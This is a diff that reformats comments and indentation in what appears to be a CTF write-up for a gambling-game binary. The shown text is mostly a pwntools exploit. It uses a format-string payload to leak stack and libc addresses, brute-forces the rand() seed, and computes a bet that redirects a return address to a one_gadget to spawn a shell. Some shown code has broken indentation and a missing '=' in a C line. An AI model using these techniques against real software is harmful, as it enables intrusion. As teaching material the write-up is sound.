@@ -28,12 +28,14 @@ void game(PlayerObj *playerObj) {
     unsigned int round = 1;
     printf("Player name:");
 
-    // playerObj is an object that includes player's name and the amount of money he has.
+    // playerObj is an object that includes 
+    // player's name and the amount of money he has.
     read_input(&playerObj->player_name, 128);
-    puts("**************************************************");
-    puts("Danh de ra de ma` o? =]]                         *");
-    puts("**************************************************");
-    printf_with_seperator(&playerObj->player_name); // will look into it in detail later.
+    
+    // ... Some prints here
+    
+    // will look into it in detail later.
+    printf_with_seperator(&playerObj->player_name); 
 
     int fd open("/dev/urandom", 0);
     if (fd < 0) {/*Make sure file was opened correctly*/}
@@ -43,7 +45,7 @@ void game(PlayerObj *playerObj) {
     while (1) {
         printf("Round: %d\n", round);
         printf("Your money: %lu ZWD\n", *playerObj->amountMoney);
-	    printf("Your bet (= 0 to exit): ");
+	      printf("Your bet (= 0 to exit): ");
         choice = getChoice();
         rand_num = rand();
         printf("Lucky number: %u\n", rand_num);
@@ -148,7 +150,7 @@ def main():
     # We want the biggest amount of money possible!
     io.sendline(str(0x8000000000000000-1)) 
 
-	io.recvuntil("Player name:")
+	  io.recvuntil("Player name:")
     
     # Leak stack and libc addresses and overwrite `.bss` pointer, will explain in detail later!
     io.sendline("%88c%13$hhn|%10$p|%29$p")
@@ -165,9 +167,9 @@ def main():
     # The libc pointer we leaked is a return pointer to `__libc_start_main` in offset 240
     libc_base = leak_libc - (libc.symbols['__libc_start_main']+240)
     io.recvuntil("Your money: ")
-	data = io.recv().split(b" ZWD")[0]
-	# Get buffer address to make sure we got it.
-	addr = int(data, 10)
+	  data = io.recv().split(b" ZWD")[0]
+	  # Get buffer address to make sure we got it.
+	  addr = int(data, 10)
 ```
 
 So far all we did was overwrite the money address (`.bss` address) with the feedback's `.bss` address and leaked a valid stack pointer that will point to a return address when feedback is received and leaked a libc pointer and calculated it's base.
@@ -189,7 +191,8 @@ libc_so = CDLL("./libc-2.23")
 rand_nums = []
 def main():
     #... (what we wrote before)
-    # 5 random numbers seems enough since every one of those is actually 2 random numbers generated.
+    # 5 random numbers seems enough since every one
+    # of those is actually 2 random numbers generated.
     for _ in range(5):
         io.sendline("1")
         io.recvuntil("Your choice:")
@@ -197,7 +200,8 @@ def main():
         io.recvuntil("Lucky number: ")
         curr_rand = io.recvline()
         
-        # Get the random number the program generated and append it to a list
+        # Get the random number the program
+        # generated and append it to a list
         rand_nums.append(int(curr_rand,10))
         io.recvuntil("Your money: ")
         data = io.recv().split(b" ZWD")[0]
@@ -205,15 +209,16 @@ def main():
         # Update the address so we can use it later
         addr = int(data, 10)
         
-    # Try all possible 3 byte combinations for seed
-    real_seed = -1
+  # Try all possible 3 byte combinations for seed
+  real_seed = -1
 	for seed in range(0xffffff):
         count = 0
         libc_so.srand(seed)
         
         for i in range(5):
             curr_rand = libc_so.rand()
-            # The program generates another rand when adding/substracting player's money
+            # The program generates another rand when 
+            # adding/substracting player's money
             libc_so.rand()
             if rand_nums[i] == curr_rand:
                 count += 1
@@ -238,7 +243,8 @@ def main():
     # Needed to calculate our bet
     add_value = libc_so.rand()
     
-    # Calculating our bet by stack addr, curr addr and the add_value the program will generate
+    # Calculating our bet by stack addr, 
+    # curr addr and the add_value the program will generate
     bet = leak_stack - (addr + add_value)
     # Send the bet
     io.sendline(str(bet))
@@ -258,9 +264,10 @@ def main():
     io.recvuntil("feeback: ")
     
     # Get one_gadget address, this is done using the one_gadget tool
-	target_addr = libc_base + 0x4527a 
+    target_addr = libc_base + 0x4527a 
     # Provide feedback.
-    # Overwrite with one_gadget address and nulls (nulls are to make sure the constraints on the one_gadget are met)
+    # Overwrite with one_gadget address and nulls 
+    # (nulls are to make sure the constraints on the one_gadget are met)
     io.sendline(p64(target_addr) + b"\x00"*(0x400-8))
 
     io.interactive()
